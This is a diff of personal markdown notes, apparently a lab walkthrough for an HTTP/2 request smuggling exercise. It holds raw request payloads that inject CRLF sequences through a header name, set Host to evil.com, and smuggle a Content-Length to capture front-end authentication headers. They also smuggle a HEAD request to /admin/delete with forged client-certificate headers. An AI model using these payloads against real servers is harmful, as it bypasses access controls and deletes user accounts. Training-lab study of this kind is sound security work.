@@ -4515,24 +4515,31 @@ Response: Communication timed out. (chunked size is 5)
     GET /
 
     Request header
-    name
+    name>
     foo: bar\r\n
-    Host: abc
+    Host: evil.com
     
     value: xyz
+
+    Response
+    Server Error: Gateway Timeout (3) connecting to evil.com
     ```
-  - Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows
+  - Send repeater for "GET /?search=YOUR-SEARCH-QUERY" > change request method to POST > delete the body of search param and content-length
+    ```
+    POST /
+    ```
+  - Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows (Adjsut the content-length)
     ```
     Request header
-    name
-    foo: bar\r\n
-    Content-Length: 500\r\n
-    \r\n
+    name>
+    foo: bar
+    Content-Length: 150
+   
     search=x
 
     value: xyz
     ```
-  - In the main body of the request (in the message editor panel) append arbitrary characters to the original search parameter until the request is longer than the smuggled Content-Length header
+  - Copy the authentication headers in below
     ```
     0 search results for 'x: xyz
     Content-Length: 644
@@ -4543,9 +4550,11 @@ Response: Communication timed out. (chunked size is 5)
     ```
   - Change the request method to HEAD and edit your malicious header so that it smuggles a request for the admin panel. Include the three client authentication headers
     ```
+    Request header
+    name>
     foo: bar
     
-    GET /admin HTTP/1.1
+    GET /admin/delete?username=carlos HTTP/1.1
     X-SSL-VERIFIED: 1
     X-SSL-CLIENT-CN: administrator
     X-FRONTEND-KEY: YOUR-UNIQUE-KEY\r\n
@@ -4553,7 +4562,6 @@ Response: Communication timed out. (chunked size is 5)
 
     value: xyz
     ```
-  - dd
 - dd
 - dd
 - dd 
